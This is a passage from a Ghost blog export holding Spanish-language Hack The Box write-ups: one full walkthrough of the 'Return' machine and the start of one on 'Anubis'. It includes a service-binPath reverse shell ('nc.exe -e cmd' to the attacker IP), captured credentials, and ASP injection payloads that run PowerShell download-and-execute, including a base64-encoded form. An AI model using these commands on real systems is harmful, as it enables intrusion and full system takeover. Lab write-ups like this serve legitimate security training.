binPath=\\\"C:\\\\Users\\\\svc-printer\\\\Desktop\\\\nc.exe -e cmd 10.10.14.21 443\\\"\\n[SC] ChangeServiceConfig SUCCESS\"}],[\"code\",{\"language\":\"sh\",\"code\":\"*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\Desktop> sc.exe stop VMTools\\n*Evil-WinRM* PS C:\\\\Users\\\\svc-printer\\\\Desktop> sc.exe start VMTools\",\"caption\":\"\"}],[\"code\",{\"language\":\"sh\",\"code\":\"C:\\\\Windows\\\\system32>whoami  \\nnt authority\\\\system\\nC:\\\\Windows\\\\system32>type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\\ntype C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\\nf8fexxxxxxxxxxxxxxxxxxxxxxx\"}]],\"markups\":[[\"strong\"],[\"em\"],[\"a\",[\"href\",\"https://github.com/Hackplayers/evil-winrm\"]],[\"a\",[\"href\",\"https://www.tarlogic.com/es/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/\"]],[\"a\",[\"href\",\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Estamos ante una máquina \"],[0,[0],1,\"Windows\"],[0,[],0,\". Esto es algo que deducimos una vez hacemos un Ping para comprobar la conexión que tenemos con ella.\"]]],[10,0],[1,\"p\",[[0,[],0,\"En la traza ICMP observamos que el TTL es de 127. Las maquinas Windows, en general, tienen un TTL configurado de 128 mientras que las máquinas Linux suelen tener un TTL de 64. En este caso, hasta llegar a la máquina pasamos por un nodo intermediario y por eso el TLL se descuenta en 1 unidad.\"]]],[1,\"p\",[[0,[],0,\"Tras un primer escaneo de puertos con NMAP, aparecen muchos de ellos abiertos. Además, en Windows este tipo de escaneos se suele demorar un poco más. Una vez escaneados los puertos abiertos con TCP Syn Scan, trato de sacar el máximo de información posible utilizando scripts básicos de reconocimiento de NMAP, para ver que información nos facilita.\"]]],[10,1],[1,\"p\",[[0,[],0,\"Hay un portal web abierto en el puerto 80 y parece un panel de administración de impresoras. Navegando un poco por la plataforma, veo un formulario de registro.\"]]],[1,\"p\",[[0,[],0,\"En estos casos donde el formulario te permite introducir una IP, una buena prueba es ponerte en escucha para ver que información te envía el servidor.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Cambio la dirección IP a mi equipo y me pongo en escucha en el mismo puerto con netcat.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Parece una contraseña. Me la guardo junto con el usuario \"],[0,[1],1,\"return\\\\svc-printer\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Además, recuerdo que el puerto RPC estaba abierto. Podría probar a conectarme con \"],[0,[2],1,\"Evil-WinRM\"],[0,[],0,\".\"]]],[10,4],[1,\"p\",[[0,[],0,\"Y listo. Obtenemos la primera flag.\"]]],[10,5],[1,\"p\",[[0,[],0,\"El siguiente paso es buscar un método que nos permita escalar privilegios de Administrator. En este punto, un buen comienzo es enumerar los privilegios que dispone el usuario actual.\"]]],[10,6],[1,\"p\",[[0,[3],1,\"SeLoadDriverPrivilege\"],[0,[],0,\" tiene vulnerabilidades conocidas que se podrían explotar, pero voy a continuar buscando información sobre los grupos a los que pertenezco.\"]]],[10,7],[1,\"p\",[[0,[],0,\"Confirmamos que estamos en el grupo de \"],[0,[1],1,\"Remote Management Use\"],[0,[],0,\" (por eso podemos conectarnos con WinRM) y además pertenezco a otros grupos. Me parece interesante \"],[0,[1],1,\"Server Operators\"],[0,[],0,\" porque tal y como se visualiza en la web de \"],[0,[4],1,\"Microsoft\"],[0,[],0,\", vemos que tiene capacidad de parar y ejecutar servicios.\"]]],[1,\"p\",[[0,[],0,\"Esto es una vulnerabilidad que se puede explotar porque los servicios son capaces de ejecutar binarios en su arranque. De esta forma, sería interesante configurar un servicio que ejecutase \"],[0,[1],1,\"nc.exe\"],[0,[],0,\" con el fin de entablar una reverse shell a mi máquina atacante.\"]]],[1,\"p\",[[0,[],0,\"Lo primero es traer a la máquina Windows el binario \"],[0,[1],1,\"nc.exe\"],[0,[],0,\".\"]]],[10,8],[1,\"p\",[[0,[],0,\"Y trato de crear el nuevo servicio de Windows.\"]]],[10,9],[1,\"p\",[[0,[],0,\"Parece que por alguna razón no podemos crear servicios. Vamos a intentar cambiar uno existente. Para ello, enumeramos aquellos que ya hay en ejecución.\"]]],[10,10],[1,\"p\",[[0,[],0,\"Tras probar a cambiar varios y ver que no me permite modificarlos, doy con uno que sí.\"]]],[10,11],[1,\"p\",[[0,[],0,\"A continuación, pongo en mi máquina netcat en escucha, paro el servicio y lo vuelvo a arrancar.\"]]],[10,12],[1,\"p\",[[0,[],0,\"Recibimos la consola por el otro lado.\"]]],[10,13],[1,\"p\",[[0,[],0,\"Obtenemos la flag y terminamos la máquina.\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Estamos ante una máquina <strong>Windows</strong>. Esto es algo que deducimos una vez hacemos un Ping para comprobar la conexión que tenemos con ella.</p><pre><code class=\"language-sh\">❯ ping 10.10.11.108 -c 1\nPING 10.10.11.108 (10.10.11.108) 56(124) bytes of data.\n64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=43.2 ms</code></pre><p>En la traza ICMP observamos que el TTL es de 127. Las maquinas Windows, en general, tienen un TTL configurado de 128 mientras que las máquinas Linux suelen tener un TTL de 64. En este caso, hasta llegar a la máquina pasamos por un nodo intermediario y por eso el TLL se descuenta en 1 unidad.</p><p>Tras un primer escaneo de puertos con NMAP, aparecen muchos de ellos abiertos. Además, en Windows este tipo de escaneos se suele demorar un poco más. Una vez escaneados los puertos abiertos con TCP Syn Scan, trato de sacar el máximo de información posible utilizando scripts básicos de reconocimiento de NMAP, para ver que información nos facilita.</p><pre><code class=\"language-sh\">nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694,59851 -sCV -v 10.10.11.108 -oN targeted\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: HTB Printer Admin Panel\n135/tcp   open  msrpc         Microsoft Windows RPC\n...</code></pre><p>Hay un portal web abierto en el puerto 80 y parece un panel de administración de impresoras. Navegando un poco por la plataforma, veo un formulario de registro.</p><p>En estos casos donde el formulario te permite introducir una IP, una buena prueba es ponerte en escucha para ver que información te envía el servidor.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-7.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"616\" height=\"319\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-7.png 600w, __GHOST_URL__/content/images/2022/02/image-7.png 616w\"></figure><p>Cambio la dirección IP a mi equipo y me pongo en escucha en el mismo puerto con netcat.</p><pre><code class=\"language-sh\">❯ nc -lvp 389\nlistening on [any] 389 ...\n10.10.11.108: inverse host lookup failed: Unknown host\nconnect to [10.10.14.21] from (UNKNOWN) [10.10.11.108] 59872\n0*`%return\\svc-printer�\n                       1edFg43012!!</code></pre><p>Parece una contraseña. Me la guardo junto con el usuario <em>return\\svc-printer</em>.</p><p>Además, recuerdo que el puerto RPC estaba abierto. Podría probar a conectarme con <a href=\"https://github.com/Hackplayers/evil-winrm\">Evil-WinRM</a>.</p><pre><code class=\"language-sh\">❯ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'\nEvil-WinRM shell v3.3\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; whoami\nreturn\\svc-printer</code></pre><p>Y listo. Obtenemos la primera flag.</p><pre><code class=\"language-sh\">*Evil-WinRM* PS C:\\Users\\svc-printer\\documents&gt; cat ../desktop/user.txt\n6df0ae750542xxxxxxxxxxxxxxxxxxx </code></pre><p>El siguiente paso es buscar un método que nos permita escalar privilegios de Administrator. En este punto, un buen comienzo es enumerar los privilegios que dispone el usuario actual.</p><pre><code class=\"language-sh\">*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                         State\n============================= =================================== =======\nSeMachineAccountPrivilege     Add workstations to domain          Enabled\nSeLoadDriverPrivilege         Load and unload device drivers      Enabled\nSeSystemtimePrivilege         Change the system time              Enabled\nSeBackupPrivilege             Back up files and directories       Enabled\nSeRestorePrivilege            Restore files and directories       Enabled\nSeShutdownPrivilege           Shut down the system                Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking            Enabled\nSeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set      Enabled\nSeTimeZonePrivilege           Change the time zone                Enabled</code></pre><p><a href=\"https://www.tarlogic.com/es/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/\">SeLoadDriverPrivilege</a> tiene vulnerabilidades conocidas que se podrían explotar, pero voy a continuar buscando información sobre los grupos a los que pertenezco.</p><pre><code class=\"language-sh\">*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; net user svc-printer\n...\nLocal Group Memberships      *Print Operators      *Remote Management Use\n                             *Server Operators\nGlobal Group memberships     *Domain Users\nThe command completed successfully.</code></pre><p>Confirmamos que estamos en el grupo de <em>Remote Management Use</em> (por eso podemos conectarnos con WinRM) y además pertenezco a otros grupos. Me parece interesante <em>Server Operators</em> porque tal y como se visualiza en la web de <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators\">Microsoft</a>, vemos que tiene capacidad de parar y ejecutar servicios.</p><p>Esto es una vulnerabilidad que se puede explotar porque los servicios son capaces de ejecutar binarios en su arranque. De esta forma, sería interesante configurar un servicio que ejecutase <em>nc.exe</em> con el fin de entablar una reverse shell a mi máquina atacante.</p><p>Lo primero es traer a la máquina Windows el binario <em>nc.exe</em>.</p><pre><code class=\"language-sh\">*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; upload /home/iocio/Desktop/iocio/HTB/Return/content/nc.exe</code></pre><p>Y trato de crear el nuevo servicio de Windows.</p><pre><code class=\"language-sh\">*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc.exe create reverse binPath=\"C:\\Users\\svc-printer\\Desktop\\nc.exe -e cmd 10.10.14.21 443\"\n[SC] OpenSCManager FAILED 5:\nAccess is denied.</code></pre><p>Parece que por alguna razón no podemos crear servicios. Vamos a intentar cambiar uno existente. Para ello, enumeramos aquellos que ya hay en ejecución.</p><pre><code class=\"language-sh\">*Evil-WinRM* PS C:\\Users\\svc-printer\\documents&gt; services\nPath                                                                                                                 Privileges Service          \n----                                                                                                                 ---------- -------          \nC:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             \n\\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{5533AFC7-64B3-4F6E-B453-E35320B35716}\\MpKslDrv.sys       True MpKslceeb2796    \nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe                                                              True NetTcpPortSharing\nC:\\Windows\\SysWow64\\perfhost.exe                                                                                           True PerfHost         \n\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\"                                                False Sense            \nC:\\Windows\\servicing\\TrustedInstaller.exe                                                                                 False TrustedInstaller \n\"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\"                                                     True VGAuthService    \n\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\"                                                                        True VMTools          \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\NisSrv.exe\"                                             True WdNisSvc         \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\MsMpEng.exe\"                                            True WinDefend        \n\"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\"                                                                      False WMPNetworkSvc</code></pre><p>Tras probar a cambiar varios y ver que no me permite modificarlos, doy con uno que sí.</p><pre><code class=\"language-sh\">*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc.exe config VMTools binPath=\"C:\\Users\\svc-printer\\Desktop\\nc.exe -e cmd 10.10.14.21 443\"\n[SC] ChangeServiceConfig SUCCESS</code></pre><p>A continuación, pongo en mi máquina netcat en escucha, paro el servicio y lo vuelvo a arrancar.</p><pre><code class=\"language-sh\">*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc.exe stop VMTools\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc.exe start VMTools</code></pre><p>Recibimos la consola por el otro lado.</p><pre><code class=\"language-sh\">C:\\Windows\\system32&gt;whoami  \nnt authority\\system\nC:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt\nf8fexxxxxxxxxxxxxxxxxxxxxxx</code></pre><p>Obtenemos la flag y terminamos la máquina.</p>",
            "comment_id": "6206e1af5a95d40061bbb836",
            "plaintext": "Estamos ante una máquina Windows. Esto es algo que deducimos una vez hacemos un Ping para comprobar la conexión que tenemos con ella.\n\n❯ ping 10.10.11.108 -c 1\nPING 10.10.11.108 (10.10.11.108) 56(124) bytes of data.\n64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=43.2 ms\n\nEn la traza ICMP observamos que el TTL es de 127. Las maquinas Windows, en general, tienen un TTL configurado de 128 mientras que las máquinas Linux suelen tener un TTL de 64. En este caso, hasta llegar a la máquina pasamos por un nodo intermediario y por eso el TLL se descuenta en 1 unidad.\n\nTras un primer escaneo de puertos con NMAP, aparecen muchos de ellos abiertos. Además, en Windows este tipo de escaneos se suele demorar un poco más. Una vez escaneados los puertos abiertos con TCP Syn Scan, trato de sacar el máximo de información posible utilizando scripts básicos de reconocimiento de NMAP, para ver que información nos facilita.\n\nnmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694,59851 -sCV -v 10.10.11.108 -oN targeted\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: HTB Printer Admin Panel\n135/tcp   open  msrpc         Microsoft Windows RPC\n...\n\nHay un portal web abierto en el puerto 80 y parece un panel de administración de impresoras. Navegando un poco por la plataforma, veo un formulario de registro.\n\nEn estos casos donde el formulario te permite introducir una IP, una buena prueba es ponerte en escucha para ver que información te envía el servidor.\n\nCambio la dirección IP a mi equipo y me pongo en escucha en el mismo puerto con netcat.\n\n❯ nc -lvp 389\nlistening on [any] 389 ...\n10.10.11.108: inverse host lookup failed: Unknown host\nconnect to [10.10.14.21] from (UNKNOWN) [10.10.11.108] 59872\n0*`%return\\svc-printer�\n                       1edFg43012!!\n\nParece una contraseña. Me la guardo junto con el usuario return\\svc-printer.\n\nAdemás, recuerdo que el puerto RPC estaba abierto. Podría probar a conectarme con Evil-WinRM.\n\n❯ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'\nEvil-WinRM shell v3.3\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> whoami\nreturn\\svc-printer\n\nY listo. Obtenemos la primera flag.\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\documents> cat ../desktop/user.txt\n6df0ae750542xxxxxxxxxxxxxxxxxxx \n\nEl siguiente paso es buscar un método que nos permita escalar privilegios de Administrator. En este punto, un buen comienzo es enumerar los privilegios que dispone el usuario actual.\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop> whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                         State\n============================= =================================== =======\nSeMachineAccountPrivilege     Add workstations to domain          Enabled\nSeLoadDriverPrivilege         Load and unload device drivers      Enabled\nSeSystemtimePrivilege         Change the system time              Enabled\nSeBackupPrivilege             Back up files and directories       Enabled\nSeRestorePrivilege            Restore files and directories       Enabled\nSeShutdownPrivilege           Shut down the system                Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking            Enabled\nSeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set      Enabled\nSeTimeZonePrivilege           Change the time zone                Enabled\n\nSeLoadDriverPrivilege tiene vulnerabilidades conocidas que se podrían explotar, pero voy a continuar buscando información sobre los grupos a los que pertenezco.\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop> net user svc-printer\n...\nLocal Group Memberships      *Print Operators      *Remote Management Use\n                             *Server Operators\nGlobal Group memberships     *Domain Users\nThe command completed successfully.\n\nConfirmamos que estamos en el grupo de Remote Management Use (por eso podemos conectarnos con WinRM) y además pertenezco a otros grupos. Me parece interesante Server Operators porque tal y como se visualiza en la web de Microsoft, vemos que tiene capacidad de parar y ejecutar servicios.\n\nEsto es una vulnerabilidad que se puede explotar porque los servicios son capaces de ejecutar binarios en su arranque. De esta forma, sería interesante configurar un servicio que ejecutase nc.exe con el fin de entablar una reverse shell a mi máquina atacante.\n\nLo primero es traer a la máquina Windows el binario nc.exe.\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop> upload /home/iocio/Desktop/iocio/HTB/Return/content/nc.exe\n\nY trato de crear el nuevo servicio de Windows.\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop> sc.exe create reverse binPath=\"C:\\Users\\svc-printer\\Desktop\\nc.exe -e cmd 10.10.14.21 443\"\n[SC] OpenSCManager FAILED 5:\nAccess is denied.\n\nParece que por alguna razón no podemos crear servicios. Vamos a intentar cambiar uno existente. Para ello, enumeramos aquellos que ya hay en ejecución.\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\documents> services\nPath                                                                                                                 Privileges Service          \n----                                                                                                                 ---------- -------          \nC:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             \n\\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{5533AFC7-64B3-4F6E-B453-E35320B35716}\\MpKslDrv.sys       True MpKslceeb2796    \nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe                                                              True NetTcpPortSharing\nC:\\Windows\\SysWow64\\perfhost.exe                                                                                           True PerfHost         \n\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\"                                                False Sense            \nC:\\Windows\\servicing\\TrustedInstaller.exe                                                                                 False TrustedInstaller \n\"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\"                                                     True VGAuthService    \n\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\"                                                                        True VMTools          \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\NisSrv.exe\"                                             True WdNisSvc         \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\MsMpEng.exe\"                                            True WinDefend        \n\"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\"                                                                      False WMPNetworkSvc\n\nTras probar a cambiar varios y ver que no me permite modificarlos, doy con uno que sí.\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop> sc.exe config VMTools binPath=\"C:\\Users\\svc-printer\\Desktop\\nc.exe -e cmd 10.10.14.21 443\"\n[SC] ChangeServiceConfig SUCCESS\n\nA continuación, pongo en mi máquina netcat en escucha, paro el servicio y lo vuelvo a arrancar.\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop> sc.exe stop VMTools\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop> sc.exe start VMTools\n\nRecibimos la consola por el otro lado.\n\nC:\\Windows\\system32>whoami  \nnt authority\\system\nC:\\Windows\\system32>type C:\\Users\\Administrator\\Desktop\\root.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt\nf8fexxxxxxxxxxxxxxxxxxxxxxx\n\nObtenemos la flag y terminamos la máquina.",
            "feature_image": "__GHOST_URL__/content/images/2022/02/return.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-11T22:22:39.000Z",
            "updated_at": "2022-02-13T19:53:09.000Z",
            "published_at": "2022-02-12T00:24:45.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c1005753014811237c",
            "uuid": "15da8f24-5873-4906-a328-d0697f5fbd3d",
            "title": "CTF - Anubis WriteUp",
            "slug": "ctf-anubis-writeup",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"sh\",\"code\":\"nmap -p- --open -sS -T5 -v -n -Pn 10.10.11.102 -oG allPorts\"}],[\"code\",{\"language\":\"sh\",\"code\":\"nmap -p135,443,445,593,49711 -sCV 10.10.11.102 -oN targeted\\nPORT      STATE SERVICE       VERSION\\n135/tcp   open  msrpc         Microsoft Windows RPC\\n443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n| ssl-cert: Subject: commonName=www.windcorp.htb\\n| Subject Alternative Name: DNS:www.windcorp.htb\\n| Not valid before: 2021-05-24T19:44:56\\n|_Not valid after:  2031-05-24T19:54:56\\n|_http-title: Not Found\\n|_ssl-date: 2022-02-12T09:44:48+00:00; +1h00m01s from scanner time.\\n|_http-server-header: Microsoft-HTTPAPI/2.0\\n| tls-alpn: \\n|_  http/1.1\\n445/tcp   open  microsoft-ds?\\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\\n49711/tcp open  msrpc         Microsoft Windows RPC\\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nHost script results:\\n| smb2-security-mode: \\n|   3.1.1: \\n|_    Message signing enabled and required\\n| smb2-time: \\n|   date: 2022-02-12T09:44:09\\n|_  start_date: N/A\\n|_clock-skew: mean: 1h00m00s, deviation: 0s, median: 59m59s\"}],[\"code\",{\"language\":\"sh\",\"code\":\" crackmapexec smb 10.10.11.102\\nSMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ smbmap -H 10.10.11.102\\n[+] IP: 10.10.11.102:445\\tName: www.windcorp.htb\\n❯ smbmap -H 10.10.11.102 -u \\\"null\\\"\\n[!] Authentication error on 10.10.11.102\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ smbclient -L 10.10.11.102 -N\\nAnonymous login successful\\n\\tSharename       Type      Comment\\n\\t---------       ----      -------\\nSMB1 disabled -- no workgroup available\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ curl -I -X GET https://10.10.11.102 -k\\nHTTP/2 404 \\n...\\n\\n❯ curl -I -X GET https://www.windcorp.htb -k\\nHTTP/2 200 \\n...\\n\",\"caption\":\"..\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-8.png\",\"width\":775,\"height\":482,\"cardWidth\":\"\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ openssl s_client --connect windcorp.htb:443\\nCONNECTED(00000003)\\ndepth=0 CN = www.windcorp.htb\\nverify error:num=18:self signed certificate\\nverify return:1\\ndepth=0 CN = www.windcorp.htb\\nverify return:1\\n---\\nCertificate chain\\n 0 s:CN = www.windcorp.htb\\n   i:CN = www.windcorp.htb\\n\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ whatweb https://www.windcorp.htb\\nhttps://www.windcorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,contact@windcorp.htb], Frame, HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.102], Lightbox, Microsoft-IIS[10.0], Script, Title[Windcorp - Index] \"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-9.png\",\"width\":723,\"height\":702}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-10.png\",\"width\":465,\"height\":259}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-13.png\",\"width\":735,\"height\":292}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-14.png\",\"width\":437,\"height\":261}],[\"code\",{\"language\":\"sh\",\"code\":\"<%response.write CreateObject(\\\"WScript.Shell\\\").Exec(\\\"ping 10.10.14.21\\\").StdOut.Readall()%>\\n\"}],[\"code\",{\"language\":\"sh\",\"code\":\"<%response.write CreateObject(\\\"WScript.Shell\\\").Exec(\\\"cmd /c powershell IEC(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\\\").StdOut.Readall()%>\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ echo \\\"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\\\">data\\n❯ cat data | iconv -t utf-16le | xxd\\n00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.\\n00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.\\n00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.\\n00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.\\n00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.\\n00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.\\n00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...\\n00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.\\n00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.\\n00000090: 2900 0a00                                )...\\n❯ cat data | iconv -t utf-16le | base64 -w0; echo\\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==\"}],[\"code\",{\"language\":\"sh\",\"code\":\"<%response.write CreateObject(\\\"WScript.Shell\\\").Exec(\\\"cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==\\\").StdOut.Readall()%>\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-16.png\",\"width\":750,\"height\":376}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ ipconfig\\nWindows IP Configuration\\nEthernet adapter vEthernet (Ethernet):\\n\\n   Connection-specific DNS Suffix  . : htb\\n   Link-local IPv6 Address . . . . . : fe80::9d2d:a5ec:4bd2:b52d%32\\n   IPv4 Address. . . . . . . . . . . : 172.22.47.185\\n   Subnet Mask . . . . . . . . . . . : 255.255.240.0\\n   Default Gateway . . . . . . . . . : 172.22.32.1\\n   \\n❯ ls C:\\\\\\n    Directory: C:\\\\\\nMode                LastWriteTime         Length Name                         \\n----                -------------         ------ ----                         \\nd-----        4/25/2021  11:23 PM                inetpub                     \\nd-r---        5/24/2021  10:49 PM                Program Files\\nd-----         4/9/2021  10:34 PM                Program Files (x86)\\nd-r---         4/9/2021  10:37 PM                Users\\nd-----        4/26/2021  12:32 AM                Windows\"}]],\"markups\":[[\"em\"],[\"a\",[\"href\",\"https://en.wikipedia.org/wiki/Null_session\"]],[\"a\",[\"href\",\"https://es.wikipedia.org/wiki/Internet_Information_Services\"]],[\"a\",[\"href\",\"https://portswigger.net/web-security/server-side-template-injection\"]],[\"a\",[\"href\",\"https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html\"]],[\"a\",[\"href\",\"https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\"]],[\"a\",[\"href\",\"https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.2\"]],[\"a\",[\"href\",\"https://wikipedia.org/wiki/UTF-16\"]],[\"a\",[\"href\",\"https://github.com/antonioCoco/ConPtyShell\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Esta máquina es diferente al resto. Su nivel es Insane y creo que es perfecta para aprender cada detalle de como progresamos en ella. Tiene además Windows instalado y toca aspectos de contenedores. Vamos a ello.\"]]],[1,\"p\",[[0,[],0,\"Iniciamos el proceso validando la comunicación con mediante un Ping donde observamos además su TTL~127 por lo que se deduce que esta Windows ejecutandose en su interior.\"]]],[1,\"p\",[[0,[],0,\"Escaneamos los puertos con nmap.\"]]],[10,0],[1,\"p\",[[0,[],0,\"Tratamos de enumerar las versiones de los puertos que tiene abiertos así como ejecutar varios scripts de reconocimiento básicos de 